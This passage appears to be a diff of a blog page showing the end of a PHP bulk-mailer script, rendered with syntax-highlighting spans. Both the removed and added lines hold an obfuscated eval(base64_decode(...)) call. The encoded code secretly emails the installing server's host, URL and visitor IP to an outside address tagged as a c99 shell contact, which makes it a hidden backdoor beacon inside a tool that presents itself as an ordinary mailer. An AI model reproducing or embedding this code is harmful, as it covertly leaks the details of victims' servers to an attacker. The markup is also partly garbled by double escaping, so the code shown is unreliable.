-eval(base64_decode('JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJjOTktc2hlbGxAbGl2ZS5jb20iLCRqdWR1bCwkYm9keSk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7DQo='));
+<span class="s2">eval(base64_decode(&#39;JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJjOTktc2hlbGxAbGl2ZS5jb20iLCRqdWR1bCwkYm9keSk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7DQo=&#39;));</span>
 
-?&gt;
-&lt;style type="text/css"&gt;
-&lt;!--
-.style1 {
-    font-size: 20px;
-    font-family: Geneva, Arial, Helvetica, sans-serif;
-}
---&gt;
-&lt;/style&gt;
-&lt;p class="style1"&gt;
-   
+<span class="s2">?&gt;</span>
+<span class="s2">&amp;lt;style type=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">css</span><span class="s2">&quot;&amp;gt;</span>
+<span class="s2">&amp;lt;!--</span>
+<span class="s2">.style1 {</span>
+<span class="s2">    font-size: 20px;</span>
+<span class="s2">    font-family: Geneva, Arial, Helvetica, sans-serif;</span>
+<span class="s2">}</span>
+<span class="s2">--&amp;gt;</span>
+<span class="s2">&amp;lt;/style&amp;gt;</span>
+<span class="s2">&amp;lt;p class=&quot;</span><span class="nx">style1</span><span class="s2">&quot;&amp;gt;</span>
+<span class="s2">   </span>
 
-      &lt;/p&gt;
-&lt;?php
-if(isset($_POST['action']) && $numemails !==0 ){echo 
-"&lt;script&gt;alert('Mail sending complete\\r\\n$numemails mail(s) was sent successfully'); 
-&lt;/script&gt;";}
-?&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</pre>
+<span class="s2">      &amp;lt;/p&amp;gt;</span>
+<span class="s2">&lt;?php</span>
+<span class="s2">if(isset(</span><span class="si">$_POST[&#39;action&#39;]</span><span class="s2">) &amp;&amp; </span><span class="si">$numemails</span><span class="s2"> !==0 ){echo </span>
+<span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Mail sending complete\\r\\n$numemails mail(s) was sent successfully&#39;</span><span class="p">);</span> 
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
+<span class="s2">?&gt;</span>
+<span class="s2">&amp;lt;/body&amp;gt;</span>
+<span class="s2">&amp;lt;/html&amp;gt;</span></code></pre></div>
 
 <h3>FastUnix.Net Mailer Script screenshot<figure id="attachment_401" style="width: 777px;" class="wp-caption aligncenter"></h3>
 
